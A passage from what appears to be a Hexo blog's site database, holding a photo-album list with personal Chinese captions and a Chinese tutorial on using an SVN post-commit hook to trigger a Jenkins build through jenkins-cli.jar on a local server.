2016,\n\t\t\t\"month\": 10,\n\t\t\t\"link\": [\"201610070940\",\"201610071029\"],\n\t\t\t\"text\": [\"家乡新建的水晶城，够气派\",\"家乡新建的水晶博物馆，怎么看也不像一个小县城该有的建筑\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-08\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 8,\n\t\t\t\"link\": [\"201608091857\"],\n\t\t\t\"text\": [\"夫子庙的秦淮人家，有“情怀”的地方\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-07\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 7,\n\t\t\t\"link\": [\"201607092200\"],\n\t\t\t\"text\": [\"我有黑夜和烧烤，你有酒吗\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-06\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 6,\n\t\t\t\"link\": [\"201606261208\",\"201606192243\"],\n\t\t\t\"text\": [\"去徐州见朋友，盛情难却，来一杆吧\",\"一个人，一片湖，一席青青草地……\"],\n\t\t\t\"sizes\": [\"750x1334\",\"1440x1080\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2015-08\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2015,\n\t\t\t\"month\": 8,\n\t\t\t\"link\": [\"201508051806\"],\n\t\t\t\"text\": [\"哥哥，妈妈，还有一只小鸭子，在老家的院子里\"],\n\t\t\t\"sizes\": [\"3264x2448\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2015-07\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2015,\n\t\t\t\"month\": 7,\n\t\t\t\"link\": [\"201507281754\"],\n\t\t\t\"text\": [\"笑\"],\n\t\t\t\"sizes\": [\"2448x2448\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2015-06\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2015,\n\t\t\t\"month\": 6,\n\t\t\t\"link\": [\"201506071825\"],\n\t\t\t\"text\": [\"高考，在考点学校的操场上，遇到初中同学\"],\n\t\t\t\"sizes\": [\"2448x3064\"]\n\t\t}\n\t}]\n}","source":"photos/ins.json","raw":"{\n\t\"list\": [{\n\t\t\"date\": \"2017-12\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 12,\n\t\t\t\"link\": [\"201712040641\"],\n\t\t\t\"text\": [\"早起升旗，本来很不情愿，好不容易周一早上没课，却要早起。但看到了将要落下的圆月……\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-11\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 11,\n\t\t\t\"link\": [\"201711261716\",\"201711251521\",\"201711042226\"],\n\t\t\t\"text\": [\"图书馆六楼的眺望\",\"图书馆六楼的眺望\",\"舍友刚买了单反，“来，给我拍一张”\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"4032x3024\",\"6000x4000\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-10\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 10,\n\t\t\t\"link\": [\"201710051637\",\"201710051628\",\"201710051554\"],\n\t\t\t\"text\": [\"站在家乡的山上，远方的民房，还有炊烟\",\"放了十几年的羊，累了，就躺在一座坟墓上\",\"和最好的朋友一起回到了初中，他感叹，物是人非了\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"3662x2744\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-09\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 9,\n\t\t\t\"link\": [\"201709162031\",\"201709050823\",\"201709050547\"],\n\t\t\t\"text\": [\"黑夜里的诚湖\",\"迎新啦~\",\"早上5点多，校园的树林里一群野猫\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"4032x3024\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-08\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 8,\n\t\t\t\"link\": [\"201708151756\",\"201708071325\",\"201708101639\",\"201708071305\"],\n\t\t\t\"text\": [\"南京，真是个奇特的城市\",\"与最好的同学回到曾经一起嬉闹的地方，图为公寓\",\"办公室楼梯的窗户上，不知谁写了“你好”\",\"与最好的同学回到曾经一起嬉闹的地方，图为教学楼\"],\n\t\t\t\"sizes\": [\"3024x4032\",\"1334x750\",\"3024x4032\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-07\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 7,\n\t\t\t\"link\": [\"201707281515\",\"201707281716\",\"201707211951\",\"201707061853\"],\n\t\t\t\"text\": [\"舅妈，表姐，和她的孩子，祖孙三辈在海底世界\",\"表姐家孩子在葡萄园，孩子永远能让人开心\",\"暑假里拉着最好的朋友一人买了一台电脑，比比谁的好看\",\"军训突然下雨，也要集合完再解散，真的勇士~\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"3024x4032\",\"4032x3024\",\"2276x1711\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-06\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 6,\n\t\t\t\"link\": [\"201706190029\"],\n\t\t\t\"text\": [\"宿舍断电断网？联机CS吧！\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-05\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 5,\n\t\t\t\"link\": [\"201705202010\"],\n\t\t\t\"text\": [\"520那天，单身的我想去图书馆溜达溜达，到了门口发现已经闭馆，悻悻然往宿舍走，突然发现远方天空的烟花\"],\n\t\t\t\"sizes\": [\"3024x4032\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-04\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 4,\n\t\t\t\"link\": [\"201704091934\",\"201704221527\",\"201704221212\",\"201704221108\"],\n\t\t\t\"text\": [\"大一最后的晚自习，只有班长一个人坐在自习室\",\"百度安全和ichunqiu联合举办的线下沙龙，有幸受邀，图为休息时间的茶点与零食\",\"中关村微软大楼\",\"中关村一角\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"3024x4032\",\"4032x3024\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-03\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 3,\n\t\t\t\"link\": [\"201703092231\"],\n\t\t\t\"text\": [\"我哥最帅！！！\"],\n\t\t\t\"sizes\": [\"540x960\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-02\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 2,\n\t\t\t\"link\": [\"201702111159\",\"201702061257\"],\n\t\t\t\"text\": [\"不负旧时光\",\"房山高中欢度春节了，可惜不是我的母校\"],\n\t\t\t\"sizes\": [\"1000x1000\",\"1334x750\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-10\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 10,\n\t\t\t\"link\": [\"201610070940\",\"201610071029\"],\n\t\t\t\"text\": [\"家乡新建的水晶城，够气派\",\"家乡新建的水晶博物馆，怎么看也不像一个小县城该有的建筑\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-08\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 8,\n\t\t\t\"link\": [\"201608091857\"],\n\t\t\t\"text\": [\"夫子庙的秦淮人家，有“情怀”的地方\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-07\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 7,\n\t\t\t\"link\": [\"201607092200\"],\n\t\t\t\"text\": [\"我有黑夜和烧烤，你有酒吗\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-06\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2016,\n\t\t\t\"month\": 6,\n\t\t\t\"link\": [\"201606261208\",\"201606192243\"],\n\t\t\t\"text\": [\"去徐州见朋友，盛情难却，来一杆吧\",\"一个人，一片湖，一席青青草地……\"],\n\t\t\t\"sizes\": [\"750x1334\",\"1440x1080\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2015-08\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2015,\n\t\t\t\"month\": 8,\n\t\t\t\"link\": [\"201508051806\"],\n\t\t\t\"text\": [\"哥哥，妈妈，还有一只小鸭子，在老家的院子里\"],\n\t\t\t\"sizes\": [\"3264x2448\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2015-07\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2015,\n\t\t\t\"month\": 7,\n\t\t\t\"link\": [\"201507281754\"],\n\t\t\t\"text\": [\"笑\"],\n\t\t\t\"sizes\": [\"2448x2448\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2015-06\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2015,\n\t\t\t\"month\": 6,\n\t\t\t\"link\": [\"201506071825\"],\n\t\t\t\"text\": [\"高考，在考点学校的操场上，遇到初中同学\"],\n\t\t\t\"sizes\": [\"2448x3064\"]\n\t\t}\n\t}]\n}","date":"2020-11-12T09:27:11.659Z","updated":"2020-10-28T10:23:34.743Z","path":"photos/ins.json","layout":"false","title":"","comments":1,"_id":"ckrlq5rcr0008q0szdo0vg2yt","content":"{\"list\":[{\"date\":\"2017-12\",\"arr\":{\"year\":2017,\"month\":12,\"link\":[\"201712040641\"],\"text\":[\"早起升旗，本来很不情愿，好不容易周一早上没课，却要早起。但看到了将要落下的圆月……\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2017-11\",\"arr\":{\"year\":2017,\"month\":11,\"link\":[\"201711261716\",\"201711251521\",\"201711042226\"],\"text\":[\"图书馆六楼的眺望\",\"图书馆六楼的眺望\",\"舍友刚买了单反，“来，给我拍一张”\"],\"sizes\":[\"4032x3024\",\"4032x3024\",\"6000x4000\"]}},{\"date\":\"2017-10\",\"arr\":{\"year\":2017,\"month\":10,\"link\":[\"201710051637\",\"201710051628\",\"201710051554\"],\"text\":[\"站在家乡的山上，远方的民房，还有炊烟\",\"放了十几年的羊，累了，就躺在一座坟墓上\",\"和最好的朋友一起回到了初中，他感叹，物是人非了\"],\"sizes\":[\"4032x3024\",\"3662x2744\",\"4032x3024\"]}},{\"date\":\"2017-09\",\"arr\":{\"year\":2017,\"month\":9,\"link\":[\"201709162031\",\"201709050823\",\"201709050547\"],\"text\":[\"黑夜里的诚湖\",\"迎新啦~\",\"早上5点多，校园的树林里一群野猫\"],\"sizes\":[\"4032x3024\",\"4032x3024\",\"4032x3024\"]}},{\"date\":\"2017-08\",\"arr\":{\"year\":2017,\"month\":8,\"link\":[\"201708151756\",\"201708071325\",\"201708101639\",\"201708071305\"],\"text\":[\"南京，真是个奇特的城市\",\"与最好的同学回到曾经一起嬉闹的地方，图为公寓\",\"办公室楼梯的窗户上，不知谁写了“你好”\",\"与最好的同学回到曾经一起嬉闹的地方，图为教学楼\"],\"sizes\":[\"3024x4032\",\"1334x750\",\"3024x4032\",\"4032x3024\"]}},{\"date\":\"2017-07\",\"arr\":{\"year\":2017,\"month\":7,\"link\":[\"201707281515\",\"201707281716\",\"201707211951\",\"201707061853\"],\"text\":[\"舅妈，表姐，和她的孩子，祖孙三辈在海底世界\",\"表姐家孩子在葡萄园，孩子永远能让人开心\",\"暑假里拉着最好的朋友一人买了一台电脑，比比谁的好看\",\"军训突然下雨，也要集合完再解散，真的勇士~\"],\"sizes\":[\"4032x3024\",\"3024x4032\",\"4032x3024\",\"2276x1711\"]}},{\"date\":\"2017-06\",\"arr\":{\"year\":2017,\"month\":6,\"link\":[\"201706190029\"],\"text\":[\"宿舍断电断网？联机CS吧！\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2017-05\",\"arr\":{\"year\":2017,\"month\":5,\"link\":[\"201705202010\"],\"text\":[\"520那天，单身的我想去图书馆溜达溜达，到了门口发现已经闭馆，悻悻然往宿舍走，突然发现远方天空的烟花\"],\"sizes\":[\"3024x4032\"]}},{\"date\":\"2017-04\",\"arr\":{\"year\":2017,\"month\":4,\"link\":[\"201704091934\",\"201704221527\",\"201704221212\",\"201704221108\"],\"text\":[\"大一最后的晚自习，只有班长一个人坐在自习室\",\"百度安全和ichunqiu联合举办的线下沙龙，有幸受邀，图为休息时间的茶点与零食\",\"中关村微软大楼\",\"中关村一角\"],\"sizes\":[\"4032x3024\",\"3024x4032\",\"4032x3024\",\"4032x3024\"]}},{\"date\":\"2017-03\",\"arr\":{\"year\":2017,\"month\":3,\"link\":[\"201703092231\"],\"text\":[\"我哥最帅！！！\"],\"sizes\":[\"540x960\"]}},{\"date\":\"2017-02\",\"arr\":{\"year\":2017,\"month\":2,\"link\":[\"201702111159\",\"201702061257\"],\"text\":[\"不负旧时光\",\"房山高中欢度春节了，可惜不是我的母校\"],\"sizes\":[\"1000x1000\",\"1334x750\"]}},{\"date\":\"2016-10\",\"arr\":{\"year\":2016,\"month\":10,\"link\":[\"201610070940\",\"201610071029\"],\"text\":[\"家乡新建的水晶城，够气派\",\"家乡新建的水晶博物馆，怎么看也不像一个小县城该有的建筑\"],\"sizes\":[\"4032x3024\",\"4032x3024\"]}},{\"date\":\"2016-08\",\"arr\":{\"year\":2016,\"month\":8,\"link\":[\"201608091857\"],\"text\":[\"夫子庙的秦淮人家，有“情怀”的地方\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2016-07\",\"arr\":{\"year\":2016,\"month\":7,\"link\":[\"201607092200\"],\"text\":[\"我有黑夜和烧烤，你有酒吗\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2016-06\",\"arr\":{\"year\":2016,\"month\":6,\"link\":[\"201606261208\",\"201606192243\"],\"text\":[\"去徐州见朋友，盛情难却，来一杆吧\",\"一个人，一片湖，一席青青草地……\"],\"sizes\":[\"750x1334\",\"1440x1080\"]}},{\"date\":\"2015-08\",\"arr\":{\"year\":2015,\"month\":8,\"link\":[\"201508051806\"],\"text\":[\"哥哥，妈妈，还有一只小鸭子，在老家的院子里\"],\"sizes\":[\"3264x2448\"]}},{\"date\":\"2015-07\",\"arr\":{\"year\":2015,\"month\":7,\"link\":[\"201507281754\"],\"text\":[\"笑\"],\"sizes\":[\"2448x2448\"]}},{\"date\":\"2015-06\",\"arr\":{\"year\":2015,\"month\":6,\"link\":[\"201506071825\"],\"text\":[\"高考，在考点学校的操场上，遇到初中同学\"],\"sizes\":[\"2448x3064\"]}}]}","site":{"data":{}},"excerpt":"","more":"{\"list\":[{\"date\":\"2017-12\",\"arr\":{\"year\":2017,\"month\":12,\"link\":[\"201712040641\"],\"text\":[\"早起升旗，本来很不情愿，好不容易周一早上没课，却要早起。但看到了将要落下的圆月……\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2017-11\",\"arr\":{\"year\":2017,\"month\":11,\"link\":[\"201711261716\",\"201711251521\",\"201711042226\"],\"text\":[\"图书馆六楼的眺望\",\"图书馆六楼的眺望\",\"舍友刚买了单反，“来，给我拍一张”\"],\"sizes\":[\"4032x3024\",\"4032x3024\",\"6000x4000\"]}},{\"date\":\"2017-10\",\"arr\":{\"year\":2017,\"month\":10,\"link\":[\"201710051637\",\"201710051628\",\"201710051554\"],\"text\":[\"站在家乡的山上，远方的民房，还有炊烟\",\"放了十几年的羊，累了，就躺在一座坟墓上\",\"和最好的朋友一起回到了初中，他感叹，物是人非了\"],\"sizes\":[\"4032x3024\",\"3662x2744\",\"4032x3024\"]}},{\"date\":\"2017-09\",\"arr\":{\"year\":2017,\"month\":9,\"link\":[\"201709162031\",\"201709050823\",\"201709050547\"],\"text\":[\"黑夜里的诚湖\",\"迎新啦~\",\"早上5点多，校园的树林里一群野猫\"],\"sizes\":[\"4032x3024\",\"4032x3024\",\"4032x3024\"]}},{\"date\":\"2017-08\",\"arr\":{\"year\":2017,\"month\":8,\"link\":[\"201708151756\",\"201708071325\",\"201708101639\",\"201708071305\"],\"text\":[\"南京，真是个奇特的城市\",\"与最好的同学回到曾经一起嬉闹的地方，图为公寓\",\"办公室楼梯的窗户上，不知谁写了“你好”\",\"与最好的同学回到曾经一起嬉闹的地方，图为教学楼\"],\"sizes\":[\"3024x4032\",\"1334x750\",\"3024x4032\",\"4032x3024\"]}},{\"date\":\"2017-07\",\"arr\":{\"year\":2017,\"month\":7,\"link\":[\"201707281515\",\"201707281716\",\"201707211951\",\"201707061853\"],\"text\":[\"舅妈，表姐，和她的孩子，祖孙三辈在海底世界\",\"表姐家孩子在葡萄园，孩子永远能让人开心\",\"暑假里拉着最好的朋友一人买了一台电脑，比比谁的好看\",\"军训突然下雨，也要集合完再解散，真的勇士~\"],\"sizes\":[\"4032x3024\",\"3024x4032\",\"4032x3024\",\"2276x1711\"]}},{\"date\":\"2017-06\",\"arr\":{\"year\":2017,\"month\":6,\"link\":[\"201706190029\"],\"text\":[\"宿舍断电断网？联机CS吧！\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2017-05\",\"arr\":{\"year\":2017,\"month\":5,\"link\":[\"201705202010\"],\"text\":[\"520那天，单身的我想去图书馆溜达溜达，到了门口发现已经闭馆，悻悻然往宿舍走，突然发现远方天空的烟花\"],\"sizes\":[\"3024x4032\"]}},{\"date\":\"2017-04\",\"arr\":{\"year\":2017,\"month\":4,\"link\":[\"201704091934\",\"201704221527\",\"201704221212\",\"201704221108\"],\"text\":[\"大一最后的晚自习，只有班长一个人坐在自习室\",\"百度安全和ichunqiu联合举办的线下沙龙，有幸受邀，图为休息时间的茶点与零食\",\"中关村微软大楼\",\"中关村一角\"],\"sizes\":[\"4032x3024\",\"3024x4032\",\"4032x3024\",\"4032x3024\"]}},{\"date\":\"2017-03\",\"arr\":{\"year\":2017,\"month\":3,\"link\":[\"201703092231\"],\"text\":[\"我哥最帅！！！\"],\"sizes\":[\"540x960\"]}},{\"date\":\"2017-02\",\"arr\":{\"year\":2017,\"month\":2,\"link\":[\"201702111159\",\"201702061257\"],\"text\":[\"不负旧时光\",\"房山高中欢度春节了，可惜不是我的母校\"],\"sizes\":[\"1000x1000\",\"1334x750\"]}},{\"date\":\"2016-10\",\"arr\":{\"year\":2016,\"month\":10,\"link\":[\"201610070940\",\"201610071029\"],\"text\":[\"家乡新建的水晶城，够气派\",\"家乡新建的水晶博物馆，怎么看也不像一个小县城该有的建筑\"],\"sizes\":[\"4032x3024\",\"4032x3024\"]}},{\"date\":\"2016-08\",\"arr\":{\"year\":2016,\"month\":8,\"link\":[\"201608091857\"],\"text\":[\"夫子庙的秦淮人家，有“情怀”的地方\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2016-07\",\"arr\":{\"year\":2016,\"month\":7,\"link\":[\"201607092200\"],\"text\":[\"我有黑夜和烧烤，你有酒吗\"],\"sizes\":[\"4032x3024\"]}},{\"date\":\"2016-06\",\"arr\":{\"year\":2016,\"month\":6,\"link\":[\"201606261208\",\"201606192243\"],\"text\":[\"去徐州见朋友，盛情难却，来一杆吧\",\"一个人，一片湖，一席青青草地……\"],\"sizes\":[\"750x1334\",\"1440x1080\"]}},{\"date\":\"2015-08\",\"arr\":{\"year\":2015,\"month\":8,\"link\":[\"201508051806\"],\"text\":[\"哥哥，妈妈，还有一只小鸭子，在老家的院子里\"],\"sizes\":[\"3264x2448\"]}},{\"date\":\"2015-07\",\"arr\":{\"year\":2015,\"month\":7,\"link\":[\"201507281754\"],\"text\":[\"笑\"],\"sizes\":[\"2448x2448\"]}},{\"date\":\"2015-06\",\"arr\":{\"year\":2015,\"month\":6,\"link\":[\"201506071825\"],\"text\":[\"高考，在考点学校的操场上，遇到初中同学\"],\"sizes\":[\"2448x3064\"]}}]}"}],"Post":[{"title":"svn提交后jenkins自动部署","date":"2020-11-13T06:53:49.000Z","_content":"\n## 一、jenkins相关\n\n### 1.创建SVN专用账号\n\n进入`jenkins`管理后台，`系统管理`-`管理用户`-左边的`新建用户`，输入相关信息后点击`新建用户`，假设你创建的账号密码分别是`svn`，`svnpwd`。\n\n<!--more-->\n\n* 此步骤可以省略，给`SVN`创建专用账户的好处是可以知道该条部署是由`SVN`自动部署，还是某人手工部署。\n\n### 2.命令部署SVN\n\n进入`jenkins`管理后台，`系统管理`-`Jenkins 命令行接口`，在页面第一行点击下载`jenkins-cli.jar`，并复制到SVN所在服务器的某个目录，例如`/home/svn/jenkins-cli.jar`，在此之前你的服务器应当已经安装了jdk环境。假设你的`jenkins`运行在`http://127.0.0.1:8080`，将要部署的项目名为`blog`，通过以下命令测试是否可以完成部署。\n\n```bash\njava -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog\n```\n\n* 注意，此命令需要`jenkins`使用`webSocket`，如果你使用不完整的反向代理配置可能导致该方法不可用。\n\n## 二、SVN相关\n\n### 1.使用post-commit\n\n进入你的`SVN`项目目录，例如`/home/svn/project`，可以看到hooks文件夹，进入该文件夹，复制`post-commit.tmpl`到当前目录命名为`post-commit`，并赋予其执行权限\n\n```bash\nchmod +x post-commit\n```\n\n清空里边的内容并编辑如下\n\n```bash\n#!/bin/sh\nREPOS=\"$1\"\nREV=\"$2\"\nsource /etc/profile\nAUTHOR=$(svnlook author -r $REV $REPOS)\necho $AUTHOR >> /home/svn/project/hooks/user.txt\nexit 0\n```\n\n测试提交代码，如果可以看到提交代码的用户名已经打印到`/home/svn/project/hooks/user.txt`文件中，则说明成功。\n\n* 提示`post-commit hook failed (exit code 255) with no output`多半是没有赋予`post-commit`可执行权限，还有可能下边的原因。我之前没有复制`post-commit.tmpl`而是选择手动新建了`post-commit`文件，就一直报错，百撕不得骑姐，后来复制`post-commit.tmpl`就没问题了。\n\n* 添加`source /etc/profile`的目的是为了确保jdk环境正常。\n\n### 2.配置命令自动部署\n\n修改`post-commit`文件为\n\n```bash\n#!/bin/sh\nsource /etc/profile\njava -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog\nexit 0\n```\n\n这样配置只要提交代码就会操作`jenkins`部署。如果需要指定用户提交代码才部署则可以如下\n\n```bash\n#!/bin/sh\nREPOS=\"$1\"\nREV=\"$2\"\nsource /etc/profile\nAUTHOR=$(svnlook author -r $REV $REPOS)\nif [ $AUTHOR == admin ];then\n    java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog\nfi\nexit 0\n```\n\n","source":"_posts/newpost-1.md","raw":"---\ntitle: svn提交后jenkins自动部署\ndate: 2020-11-13 14:53:49\ntags: [运维,持续集成]\n---\n\n## 一、jenkins相关\n\n### 1.创建SVN专用账号\n\n进入`jenkins`管理后台，`系统管理`-`管理用户`-左边的`新建用户`，输入相关信息后点击`新建用户`，假设你创建的账号密码分别是`svn`，`svnpwd`。\n\n<!--more-->\n\n* 此步骤可以省略，给`SVN`创建专用账户的好处是可以知道该条部署是由`SVN`自动部署，还是某人手工部署。\n\n### 2.命令部署SVN\n\n进入`jenkins`管理后台，`系统管理`-`Jenkins 命令行接口`，在页面第一行点击下载`jenkins-cli.jar`，并复制到SVN所在服务器的某个目录，例如`/home/svn/jenkins-cli.jar`，在此之前你的服务器应当已经安装了jdk环境。假设你的`jenkins`运行在`http://127.0.0.1:8080`，将要部署的项目名为`blog`，通过以下命令测试是否可以完成部署。\n\n```bash\njava -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog\n```\n\n* 注意，此命令需要`jenkins`使用`webSocket`，如果你使用不完整的反向代理配置可能导致该方法不可用。\n\n## 二、SVN相关\n\n### 1.使用post-commit\n\n进入你的`SVN`项目目录，例如`/home/svn/project`，可以看到hooks文件夹，进入该文件夹，复制`post-commit.tmpl`到当前目录命名为`post-commit`，并赋予其执行权限\n\n```bash\nchmod +x post-commit\n```\n\n清空里边的内容并编辑如下\n\n```bash\n#!/bin/sh\nREPOS=\"$1\"\nREV=\"$2\"\nsource /etc/profile\nAUTHOR=$(svnlook author -r $REV $REPOS)\necho $AUTHOR >> /home/svn/project/hooks/user.txt\nexit 0\n```\n\n测试提交代码，如果可以看到提交代码的用户名已经打印到`/home/svn/project/hooks/user.txt`文件中，则说明成功。\n\n* 提示`post-commit hook failed (exit code 255) with no output`多半是没有赋予`post-commit`可执行权限，还有可能下边的原因。我之前没有复制`post-commit.tmpl`而是选择手动新建了`post-commit`文件，就一直报错，百撕不得骑姐，后来复制`post-commit.tmpl`就没问题了。\n\n* 添加`source /etc/profile`的目的是为了确保jdk环境正常。\n\n### 2.配置命令自动部署\n\n修改`post-commit`文件为\n\n```bash\n#!/bin/sh\nsource /etc/profile\njava -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog\nexit 0\n```\n\n这样配置只要提交代码就会操作`jenkins`部署。如果需要指定用户提交代码才部署则可以如下\n\n```bash\n#!/bin/sh\nREPOS=\"$1\"\nREV=\"$2\"\nsource /etc/profile\nAUTHOR=$(svnlook author -r $REV $REPOS)\nif [ $AUTHOR == admin ];then\n    java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog\nfi\nexit 0\n```\n\n","slug":"newpost-1","published":1,"updated":"2020-12-07T02:01:54.807Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rch0000q0szubahhx8z","content":"<h2 id=\"一、jenkins相关\"><a href=\"#一、jenkins相关\" class=\"headerlink\" title=\"一、jenkins相关\"></a>一、jenkins相关</h2><h3 id=\"1-创建SVN专用账号\"><a href=\"#1-创建SVN专用账号\" class=\"headerlink\" title=\"1.创建SVN专用账号\"></a>1.创建SVN专用账号</h3><p>进入<code>jenkins</code>管理后台，<code>系统管理</code>-<code>管理用户</code>-左边的<code>新建用户</code>，输入相关信息后点击<code>新建用户</code>，假设你创建的账号密码分别是<code>svn</code>，<code>svnpwd</code>。</p>\n<a id=\"more\"></a>\n<ul>\n<li>此步骤可以省略，给<code>SVN</code>创建专用账户的好处是可以知道该条部署是由<code>SVN</code>自动部署，还是某人手工部署。</li>\n</ul>\n<h3 id=\"2-命令部署SVN\"><a href=\"#2-命令部署SVN\" class=\"headerlink\" title=\"2.命令部署SVN\"></a>2.命令部署SVN</h3><p>进入<code>jenkins</code>管理后台，<code>系统管理</code>-<code>Jenkins 命令行接口</code>，在页面第一行点击下载<code>jenkins-cli.jar</code>，并复制到SVN所在服务器的某个目录，例如<code>/home/svn/jenkins-cli.jar</code>，在此之前你的服务器应当已经安装了jdk环境。假设你的<code>jenkins</code>运行在<code>http://127.0.0.1:8080</code>，将要部署的项目名为<code>blog</code>，通过以下命令测试是否可以完成部署。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar /home/svn/jenkins-cli.jar -s http://127.0.0.1:8080 -auth svn:svnpwd build blog</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意，此命令需要<code>jenkins</code>使用<code>webSocket</code>，如果你使用不完整的反向代理配置可能导致该方法不可用。</li>\n</ul>\n<h2 id=\"二、SVN相关\"><a href=\"#二、SVN相关\" class=\"headerlink\" title=\"二、SVN相关\"></a>二、SVN相关</h2><h3 id=\"1-使用post-commit\"><a href=\"#1-使用post-commit\" class=\"headerlink\" title=\"1.使用post-commit\"></a>1.使用post-commit</h3><p>进入你的<code>SVN</code>项目目录，例如<code>/home/svn/project</code>，可以看到hooks文件夹，进入该文件夹，复制<code>post-commit.tmpl</code>到当前目录命名为<code>post-commit</code>，并赋予其执行权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x post-commit</span><br></pre></td></tr></table></figure>\n<p>清空里边的内容并编辑如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">REPOS=<span class=\"string\">\"<span class=\"variable\">$1</span>\"</span></span><br><span class=\"line\">REV=<span class=\"string\">\"<span class=\"variable\">$2</span>\"</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\">AUTHOR=$(svnlook author -r <span class=\"variable\">$REV</span> <span class=\"variable\">$REPOS</span>)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$AUTHOR</span> &gt;&gt; /home/svn/project/hooks/user.txt</span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\n<p>测试提交代码，如果可以看到提交代码的用户名已经打印到<code>/home/svn/project/hooks/user.txt</code>文件中，则说明成功。</p>\n<ul>\n<li><p>提示<code>post-commit hook failed (exit code 255) with no 